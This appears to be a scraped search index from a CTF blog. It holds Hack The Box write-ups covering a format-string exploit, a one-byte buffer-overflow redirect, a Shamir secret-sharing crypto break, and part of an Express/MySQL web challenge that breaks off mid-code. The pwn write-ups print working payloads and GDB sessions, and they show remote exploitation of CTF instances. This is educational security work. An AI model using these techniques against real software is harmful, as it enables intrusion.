▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░▒▓▓▓░░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓▒░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▒░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒░░░▓▓░░░▓▓▒░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒░░░▒▓▓░░░▓▓▒ ░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░░░░░▓▓░░░▓▓▓ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▓▓▓▒░░░░▓▓▒ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░▒░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓░▒▓▓▓░░░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒░▓▓▓░░░░ ▓▓ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 1. Scan card 💳 2. Insert password  \u0026gt;  If we decompile the binary with Ghidra, we see the main function:\nundefined8 main() { longlVar1; longin_FS_OFFSET; longlocal_48; long*local_40; charlocal_38[40]; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); setup(); banner(); local_48 =0xdeadbeef; local_40 =\u0026amp;local_48; printf(\u0026amp;DAT_001025e0); lVar1 =read_num(); if(lVar1 !=1) { if(lVar1 ==2) { check_pass(); } printf(\u0026amp;DAT_00102668, \u0026amp;DAT_0010259a); /* WARNING: Subroutine does not return */ exit(0x1b39); } printf(\"\\n[!] Scanning card.. Something is wrong!\\n\\nInsert card\\'s serial number: \"); read(0,local_38, 0x1f); printf(\"\\nYour card is: \"); printf(local_38); if(local_48 ==0xdead1337) { open_door(); } else{ printf(\u0026amp;DAT_001026a0, \u0026amp;DAT_0010259a); } if(local_10 ==*(long*) (in_FS_OFFSET +0x28)) { return0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); }  The second option requires a password:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 2 [*] Insert password: asdf [-] Invalid password! Intruder detected! 🚨 🚨  The function that handles authentication is check_pass:\nvoidcheck_pass() { intiVar1; longin_FS_OFFSET; undefined8 local_28; undefined8 local_20; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); local_28 =0; local_20 =0; printf(\"[*] Insert password: \"); read(0, \u0026amp;local_28, 0xf); iVar1 =strncmp(\"0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455\", (char*) \u0026amp;local_28, 0x21); if(iVar1 !=0) { printf(\u0026amp;DAT_001025a8, \u0026amp;DAT_0010259a); /* WARNING: Subroutine does not return */ exit(0x1b39); } open_door(); if(local_10 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  As it is shown, the program reads 0xf (15) bytes and compares it with 0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455. However, we are not able to enter more than 15 bytes, so there\u0026rsquo;s no way we can pass this check.\nIf we were able to pass it, then open_door would be called, and the flag would be shown:\nvoidopen_door() { longlVar1; longin_FS_OFFSET;  lVar1 =*(long*) (in_FS_OFFSET +0x28); printf(\"\\n%s[+] Door opened, you can proceed with the passphrase: \", \u0026amp;DAT_00100eb8); system(\"cat flag*\"); if(lVar1 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Going again to main, we can see that we have another possibility if we choose the first option:\nprintf(\"\\n[!] Scanning card.. Something is wrong!\\n\\nInsert card\\'s serial number: \"); read(0,local_38, 0x1f); printf(\"\\nYour card is: \"); printf(local_38); if(local_48 ==0xdead1337) { open_door(); } else{ printf(\u0026amp;DAT_001026a0, \u0026amp;DAT_0010259a); }  Here we have a Format String vulnerability, since printf uses as first argument the same information we provide as \u0026ldquo;card\u0026rsquo;s serial number\u0026rdquo;. A simple proof of concept:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %x Your card is: eb7a7420 [-] Invalid password! Intruder detected! 🚨 🚨  The value eb7a7420 is a value taken from the stack, so we can potentially read and write values to the stack using the Format String vulnerability.\nHere, if local_48 had a value of 0xdead1337, then open_door would be called. Unfortunately, local_48 is set to 0xdeadbeef, so it is different.\nBut we can use the Format String vulnerability to modify the value of that local variable. Let\u0026rsquo;s find the offset in the stack where local_48 is stored:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. Your card is: 7ffed66b4cf0.7f61975088c0.0.f.0.deadbeef.7ffed66b7390.2e786c252e786c25 [-] Invalid password! Intruder detected! 🚨 🚨  It appears to be at position 6. Let\u0026rsquo;s verify it using %6$lx:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %6$lx Your card is: deadbeef [-] Invalid password! Intruder detected! 🚨 🚨  Alright. Now we must use format %n (for example, %6$n) in order to write data into memory. The way %6$n works is that it stores the number of characters printed until %6$n into the address at the sixth position in the stack.\nFor this reason, we can\u0026rsquo;t use %6$n, because 0xdeadbeef is not a valid address. We must find the address that contains 0xdeafbeef. Let\u0026rsquo;s use GDB to find it:\n$ gdb -q sp_entrypoint Reading symbols from sp_entrypoint... (No debugging symbols found in sp_entrypoint) gef➤ run Starting program: ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7af2031 in read () from ./glibc/libc.so.6  gef➤ grep 0xdeadbeef [+] Searching '\\xef\\xbe\\xad\\xde' in memory [+] In './sp_entrypoint'(0x555555400000-0x555555403000), permission=r-x 0x555555400d18 - 0x555555400d28 → \"\\xef\\xbe\\xad\\xde[...]\" [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe650 - 0x7fffffffe660 → \"\\xef\\xbe\\xad\\xde[...]\"  So local_48 is at 0x7fffffffe650. Now let\u0026rsquo;s enumerate the Format String vulnerability again:\ngef➤ continue Continuing. 1 [!] Scanning card.. Something is wrong! Insert card's serial number%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. Your card is: 7fffffffbfb0.7ffff7dcf8c0.0.f.0.deadbeef.7fffffffe650.2e786c252e786c25 [-] Invalid password! Intruder detected! 🚨 🚨 [Inferior 1 (process 76812) exited normally]  Ok, we need to write into position 7, so we will be using %7$n.\nActually, we can use %7$hn to overwrite half word (2 bytes), because it is what we need in this situation. In order to print 0x1337 (4919) bytes, we can use another format string, that is %4919c. Let\u0026rsquo;s try:\n1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %4919c%7$hn Your card is: [+] Door opened, you can proceed with the passphrase: HTB{f4k3_fl4g_f0r_t3st1ng}  We have it. Let\u0026rsquo;s exploit the remote instance then:\n$ nc 178.62.26.185 31995 ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %4919c%7$hn Your card is: [+] Door opened, you can proceed with the passphrase: HTB{g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-entrypoint/","section":"ctf","summary":"64-bit binary. Format String vulnerability. Local variable modification","time":5,"title":"Space pirate: Entrypoint"},{"contents":"We are given a 64-bit binary called sp_going_deeper:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/'  If we run it, we will see three options:\n$ ./sp_going_deeper Trying to leak information from the pc.. 🖥️ ____________________________________________________ / \\ | _____________________________________________ | | | | | | | goldenfang@d12:$ history | | | | 1 ls | | | | 2 mv secret_pass.txt flag.txt | | | | 3 chmod -x missile_launcher.py | | | | 4 ls | | | | 5 history | | | | | | | | | | | | | | | | | | | | | | | | | | | |_____________________________________________| | | | \\_____________________________________________________/ \\_______________________________________/ _______________________________________________ _-' .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. --- `-_ _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--. .-.-.`-_ _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_ _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_ :-----------------------------------------------------------------------------: `---._.-----------------------------------------------------------------._.---' [*] Safety mechanisms are enabled! [*] Values are set to: a = [1], b = [2], c = [3]. [*] If you want to continue, disable the mechanism or login as admin. 1. Disable mechanisms ⚙️ 2. Login ✅ 3. Exit 🏃 \u0026gt;\u0026gt;  At this point, let\u0026rsquo;s open the binary in Ghidra to analyze decompiled source code in C. This is the main function:\nundefined8main() { setup(); banner(); puts(\"\\x1b[1;34m\"); admin_panel(1, 2, 3); return0; }  And this function calls admin_panel using parameters 1, 2 and 3:\nvoidadmin_panel(longparam_1, longparam_2, longparam_3) { intiVar1; charlocal_38[40]; longlocal_10;  local_10 =0; printf(\"[*] Safety mechanisms are enabled!\\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \\n[*] If you want to continue, disable the mechanismor login as admin.\\n\", param_1, param_2, param_3); while(((local_10 !=1\u0026amp;\u0026amp;(local_10 !=2)) \u0026amp;\u0026amp;(local_10 !=3))) { printf(\u0026amp;DAT_004014e8); local_10 =read_num(); } if(local_10 ==1) { printf(\"\\n[*] Input: \"); } else{ if(local_10 !=2) { puts(\"\\n[!] Exiting..\\n\"); /* WARNING: Subroutine does not return */ exit(0x1b39); } printf(\"\\n[*] Username: \"); } read(0, local_38, 0x39); if(((param_1 ==0xdeadbeef) \u0026amp;\u0026amp;(param_2 ==0x1337c0de)) \u0026amp;\u0026amp;(param_3 ==0x1337beef)) { iVar1 =strncmp(\"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\", local_38, 0x34);  if(iVar1 !=0) { printf(\"\\n%s[+] Welcome admin! The secret message is: \", \u0026amp;DAT_00400c38); system(\"cat flag*\"); gotoLAB_00400b38; } } printf(\"\\n%s[-] Authentication failed!\\n\", \u0026amp;DAT_00400c40); LAB_00400b38: puts(\"\\n[!] For security reasons, you are logged out..\\n\"); return; }  The first thing to notice is that we need to use the first or the second option to reach the point where system(\u0026quot;cat flag*\u0026quot;) is executed. For that, we need to fail in a string comparisong with a hard-coded password (notice that it checks that iVar1 != 0). Moreover, the parameters passed to the function must be 0xdeadbeef, 0x1337c0de and 0x1337beef (and not 1, 2, 3).\nThere exists a Buffer Overflow vulnerability. Notice that local_38 is a character array of 40 bytes, and the program reads up to 0x39 (57) bytes. Hence, we are able to overwrite values on the stack (for instance, the return address).\nThe idea is to overwrite the return address with the address of system(\u0026quot;cat flag*\u0026quot;) (actually, one or two addresses above), so that we can redirect code execution and read the flag. Let\u0026rsquo;s try to crash the program:\n$ ./sp_going_deeper ... [*] Safety mechanisms are enabled! [*] Values are set to: a = [1], b = [2], c = [3]. [*] If you want to continue, disable the mechanism or login as admin. 1. Disable mechanisms ⚙️ 2. Login ✅ 3. Exit 🏃 \u0026gt;\u0026gt; 1 [*] Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaa [-] Authentication failed! [!] For security reasons, you are logged out.. zsh: segmentation fault (core dumped) ./sp_going_deeper  It crashes, which means that the return address got modified and the execution flow broke. Let\u0026rsquo;s use GDB to see how we can control the return address:\n$ gdb -q sp_going_deeper Reading symbols from sp_going_deeper... (No debugging symbols found in sp_going_deeper) gef➤ disassemble admin_panel Dump of assembler code for function admin_panel: ... 0x0000000000400aba \u0026lt;+209\u0026gt;: call 0x400730 \u0026lt;read@plt\u0026gt; 0x0000000000400abf \u0026lt;+214\u0026gt;: mov eax,0xdeadbeef 0x0000000000400ac4 \u0026lt;+219\u0026gt;: cmp QWORD PTR [rbp-0x38],rax 0x0000000000400ac8 \u0026lt;+223\u0026gt;: jne 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400aca \u0026lt;+225\u0026gt;: cmp QWORD PTR [rbp-0x40],0x1337c0de 0x0000000000400ad2 \u0026lt;+233\u0026gt;: jne 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400ad4 \u0026lt;+235\u0026gt;: cmp QWORD PTR [rbp-0x48],0x1337beef 0x0000000000400adc \u0026lt;+243\u0026gt;: jne 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400ade \u0026lt;+245\u0026gt;: lea rax,[rbp-0x30] 0x0000000000400ae2 \u0026lt;+249\u0026gt;: mov edx,0x34 0x0000000000400ae7 \u0026lt;+254\u0026gt;: mov rsi,rax 0x0000000000400aea \u0026lt;+257\u0026gt;: lea rdi,[rip+0xa67] # 0x401558 0x0000000000400af1 \u0026lt;+264\u0026gt;: call 0x4006e0 \u0026lt;strncmp@plt\u0026gt; 0x0000000000400af6 \u0026lt;+269\u0026gt;: test eax,eax 0x0000000000400af8 \u0026lt;+271\u0026gt;: je 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400afa \u0026lt;+273\u0026gt;: lea rsi,[rip+0x137] # 0x400c38 0x0000000000400b01 \u0026lt;+280\u0026gt;: lea rdi,[rip+0xa88] # 0x401590 0x0000000000400b08 \u0026lt;+287\u0026gt;: mov eax,0x0 0x0000000000400b0d \u0026lt;+292\u0026gt;: call 0x400710 \u0026lt;printf@plt\u0026gt; 0x0000000000400b12 \u0026lt;+297\u0026gt;: lea rdi,[rip+0xaa5] # 0x4015be 0x0000000000400b19 \u0026lt;+304\u0026gt;: call 0x400700 \u0026lt;system@plt\u0026gt; ... End of assembler dump.  I will be using address 0x400afa. In order to send this address, it must be formatted as bytes (little-endian format). Let\u0026rsquo;s exploit it locally:\n$ gdb -q sp_going_deeper Reading symbols from sp_going_deeper... (No debugging symbols found in sp_going_deeper) gef➤ run Starting program: ./sp_going_deeper ... [*] Safety mechanisms are enabled! [*] Values are set to: a = [1], b = [2], c = [3]. [*] If you want to continue, disable the mechanism or login as admin. 1. Disable mechanisms ⚙️ 2. Login ✅ 3. Exit 🏃 \u0026gt;\u0026gt; 1 [*] Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [-] Authentication failed! [!] For security reasons, you are logged out.. Program received signal SIGSEGV, Segmentation fault. 0x0000000000400b41 in admin_panel ()  gef➤ x $rsp 0x7fffffffe600: 0x00400ba0 gef➤ p $rip $1 = (void (*)()) 0x400b41 \u0026lt;admin_panel+344\u0026gt;  This is not happening as expected since we don\u0026rsquo;t see the string of A in the stack. Let\u0026rsquo;s use another letter, for example B, just in case:\ngef➤ x $rsp 0x7fffffffe600: 0x00400ba0 gef➤ p $rip $2 = (void (*)()) 0x400b42 \u0026lt;admin_panel+345\u0026gt;  Can you see the differences? The first $rip was modified to 0x400b41, and the second one to 0x400b42. This means that we only have one byte overflow, but it is enough to redirect code execution. For instance, we can point $rip to 0x400b01 (entering \\x01). Let\u0026rsquo;s use Python and pwntools to develop the exploit. We can test it locally:\n$ python3 solve.py [*] './sp_going_deeper' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' [+] Starting local process './sp_going_deeper': pid 39473 [+] Flag: HTB{f4k3_fl4g_f0r_t35t1ng} [*] Stopped process './sp_going_deeper' (pid 39473)  And it works, so let\u0026rsquo;s try in remote:\n$ python3 solve.py 142.93.40.15:32536 [*] './sp_going_deeper' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' [+] Opening connection to 142.93.40.15 on port 32536: Done [+] Flag: HTB{d1g_1n51d3..u_Cry_cry_cry} [*] Closed connection to 142.93.40.15 port 32536  The full exploit script can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-going-deeper/","section":"ctf","summary":"64-bit binary. Buffer Overflow. Redirecting program execution","time":5,"title":"Space pirate: Going Deeper"},{"contents":"We are given this Python source code:\nfromsympyimport* fromhashlibimportmd5 fromCrypto.CipherimportAES fromCrypto.Util.Paddingimportpad fromrandomimportrandint, randbytes, seed FLAG=b'HTB{dummyflag}' classShamir: def__init__(self, prime, k, n): self.p=prime self.secret=randint(1, self.p-1) self.k=k self.n=n self.coeffs=[self.secret] self.x_vals=[] self.y_vals=[] defnext_coeff(self, val): returnint(md5(val.to_bytes(32, byteorder='big')).hexdigest(), 16) defcalc_coeffs(self): foriinrange(1, self.n+1): self.coeffs.append(self.next_coeff(self.coeffs[i-1])) defcalc_y(self, x): y=0 fori, coeffinenumerate(self.coeffs): y+=coeff*x**i returny%self.p defcreate_pol(self): self.calc_coeffs() self.coeffs=self.coeffs[:self.k] for_inrange(self.n): x=randint(1, self.p-1) self.x_vals.append(x) self.y_vals.append(self.calc_y(x)) defget_share(self): returnself.x_vals[0], self.y_vals[0] defmain(): sss=Shamir(92434467187580489687, 10, 18) sss.create_pol() share=sss.get_share() seed(sss.secret) key=randbytes(16) cipher=AES.new(key, AES.MODE_ECB) enc_FLAG=cipher.encrypt(pad(FLAG, 16)).hex() print(sss.coeffs) f=open('msg.enc', 'w') f.write('share: '+str(share) +'\\n') f.write('coefficient: '+str(sss.coeffs[1]) +'\\n') f.write('secret message: '+str(enc_FLAG) +'\\n') f.close() if__name__=='__main__': main()  And this is the output:\nshare: (21202245407317581090, 11086299714260406068) coefficient: 93526756371754197321930622219489764824 secret message: 1aaad05f3f187bcbb3fb5c9e233ea339082062fc10a59604d96bcc38d0af92cd842ad7301b5b72bd5378265dae0bc1c1e9f09a90c97b35cfadbcfe259021ce495e9b91d29f563ae7d49b66296f15e7999c9e547fac6f1a2ee682579143da511475ea791d24b5df6affb33147d57718eaa5b1b578230d97f395c458fc2c9c36525db1ba7b1097ad8f5df079994b383b32695ed9a372ea9a0eb1c6c18b3d3d43bd2db598667ef4f80845424d6c75abc88b59ef7c119d505cd696ed01c65f374a0df3f331d7347052faab63f76f587400b6a6f8b718df1db9cebe46a4ec6529bc226627d39baca7716a4c11be6f884c371b08d87c9e432af58c030382b737b9bb63045268a18455b9f1c4011a984a818a5427231320ee7eca39bdfe175333341b7c  It uses Shamir Secret Sharing (SSS) to get a shared value to initialize random.seed, so that the key for an AES cipher is \u0026ldquo;random\u0026rdquo;. Then, it encrypts the flag using AES.\nThis time, the SSS parameters are $p = 92434467187580489687$, $k = 10$ and $n = 18$. Hence, the server creates a polynomial $P \\in \\mathbb{Z}/p\\mathbb{Z}[x]$ like this:\n$$ P(x) = s + a_1 x + a_2 x^2 + a_3 x^3 + \\dots + a_k x^k $$\nThe secret is denoted by $s$ (the constant term).\nThen, the server must compute some pairs $(x_i, P(x_i))$. In fact, from $(x_1, P(x_1))$ up to $(x_n, P(x_n))$.\nThe share that the program provides us is $(x_1, P(x_1))$. We are also given the coefficient $a_1$.\nThe vulnerability here is that the coefficients $a_i$ are related as follows:\ndefnext_coeff(self, val): returnint(md5(val.to_bytes(32, byteorder='big')).hexdigest(), 16) defcalc_coeffs(self): foriinrange(1, self.n+1): self.coeffs.append(self.next_coeff(self.coeffs[i-1]))  Hence, $a_{i + 1} = \\mathrm{MD5}(a_i)$. Considering that we know $a_1$, we can compute $a_2$, then $a_3$, and by induction $a_k$\u0026hellip; So we can get all the coefficients of the polynomial $P$ but the constant term $s$.\nHaving all $a_i$ is useful because we also have the share $(x_1, P(x_1))$, so we can solve the following equation for $s$, which is the only unknown:\n$$ P(x_1) = s + a_1 x_1 + a_2 x_1^2 + \\dots + a_k x_1^k $$\nTherefore\n$$ s = P(x_1) - a_1 x_1 - a_2 x_1^2 - \\dots - a_k x_1^k $$\nAnd once we have $s$, we can initialize random.seed and obtain the same \u0026ldquo;random\u0026rdquo; key used for AES encryption in order to decrypt the ciphertext and get the flag.\nAll computations are written in this Python script: solve.py:\n$ python3 solve.py The treasure is located at galaxy VS-708. Our team needs 3 light years to reach it. Our solar cruise has its steam canons ready to fire in case we encounter enemies. Next time you will hear from us brother, everyone is going to be rich! HTB{1_d1dnt_kn0w_0n3_sh4r3_w45_3n0u9h!1337}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/space-pirates/","section":"ctf","summary":"Shamir Secret Sharing. PRNG seed","time":2,"title":"Space Pirates"},{"contents":"We are given the source code of a Node.js web project using Express JS and MySQL. In the Dockerfile an entrypoint.sh script is run:\n#!/bin/ash # Secure entrypoint chmod 600 /entrypoint.sh # Initialize \u0026amp; Start MariaDB mkdir -p /run/mysqld chown -R mysql:mysql /run/mysqld mysql_install_db --user=mysql --ldata=/var/lib/mysql mysqld --user=mysql --console --skip-name-resolve --skip-networking=0 \u0026amp; # Wait for mysql to start while ! mysqladmin ping -h'localhost' --silent; do echo \"mysqld is not yet alive\" \u0026amp;\u0026amp; sleep .2; done # admin password PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1) # create database mysql -u root \u0026lt;\u0026lt; EOF CREATE DATABASE spiky_tamagotchi; CREATE TABLE spiky_tamagotchi.users ( id INT AUTO_INCREMENT NOT NULL, username varchar(255) UNIQUE NOT NULL, password varchar(255) NOT NULL, PRIMARY KEY (id) ); INSERT INTO spiky_tamagotchi.users VALUES (1,'admin','${PASSWORD}'); GRANT ALL PRIVILEGES ON spiky_tamagotchi.* TO 'rh0x01'@'%' IDENTIFIED BY 'r4yh4nb34t5b1gm4c'; FLUSH PRIVILEGES; EOF # launch supervisord /usr/bin/supervisord -c /etc/supervisord.conf  Here we see that the database contains a username called admin and a random password.\nThere are functions called registerUser and loginUser in the source code (database.js). Both of them use prepared statements, so SQL injection is not possible:\nlet mysql = require('mysql') class Database { constructor() { this.connection = mysql.createConnection({ host: 'localhost', user: 'rh0x01', password: 'r4yh4nb34t5b1gm4c', database: 'spiky_tamagotchi' }); } async registerUser(user, pass) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = 'INSERT INTO users (username, password) VALUES (?, ?)'; this.connection.query(stmt, [user, pass], (err, result) =\u0026gt; { if(err) reject(err) resolve(result) }) }); } async loginUser(user, pass) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?'; let x = this.connection.query(stmt, [user, pass], (err, result) =\u0026gt; { if(err || result.length == 0) reject(err) resolve(result) }) }); } } module.exports = Database;  Unfortunately, there is no way to register a new user using registerUser:\nconst express = require('express') const router = express.Router() const JWTHelper = require('../helpers/JWTHelper') const SpikyFactor = require('../helpers/SpikyFactor') const AuthMiddleware = require('../middleware/AuthMiddleware') const response = data =\u0026gt; ({ message: data }) router.get('/', (req, res) =\u0026gt; { return res.render('index.html') }) router.post('/api/login', async (req, res) =\u0026gt; { const { username, password } = req.body if (username \u0026amp;\u0026amp; password) { return db .loginUser(username, password) .then(user =\u0026gt; { let token = JWTHelper.sign({ username: user[0].username }) res.cookie('session', token, { maxAge: 3600000 }) return res.send(response('User authenticated successfully!')) }) .catch(() =\u0026gt; res.status(403).send(response('Invalid username or password!'))) } return res.status(500).send(response('Missing required parameters!')) }) router.get('/interface', AuthMiddleware, async (req, res) =\u0026gt; { return res.render('interface.html') }) router.post('/api/activity', AuthMiddleware, async (req, res) =\u0026gt; { const { activity, health, weight, happiness } = req.body if (activity \u0026amp;\u0026amp; health \u0026amp;\u0026amp; weight \u0026amp;\u0026amp; happiness) { return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness)) .then(status =\u0026gt; { return res.json(status) }) .catch(e =\u0026gt; { res.send(response('Something went wrong!')) }) } return res.send(response('Missing required parameters!')) }) router.get('/logout', (req, res) =\u0026gt; { res.clearCookie('session') return res.redirect('/') }) module.exports = database =\u0026gt; { db = database return router }  Therefore, we must bypass authentication in some way. Here we have helpers/JWTHelper.js, which is the way the server handles authentication:\nconst jwt = require('jsonwebtoken'); const crypto = 